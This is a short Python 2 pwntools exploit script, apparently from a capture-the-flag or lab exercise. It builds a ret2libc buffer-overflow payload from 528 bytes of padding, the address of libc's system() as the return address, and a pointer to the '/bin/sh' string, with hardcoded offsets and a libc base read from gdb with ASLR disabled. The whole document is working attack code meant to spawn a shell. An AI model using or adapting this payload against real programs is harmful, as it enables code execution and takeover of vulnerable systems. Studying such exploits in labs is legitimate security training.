#!/usr/bin/env python

"""PYTHON2 only"""
from pwn import *

bin_sh_offset = 0x15ccc8 # read using string -t x -a /path/to/libc | grep "/bin/sh"
system_offset = 0x03a850 # read using readelf -s /path/to/libc | grep "system"

libc_addr = 0xf7e12000   # no aslr so just break main in gdb and use info proc map

system_addr = libc_addr + system_offset
bin_sh_addr = libc_addr + bin_sh_offset

padding = 'a'*528
ret_addr = p32(system_addr)
payload = p32(bin_sh_addr)

exp = padding + ret_addr + payload*10

print exp
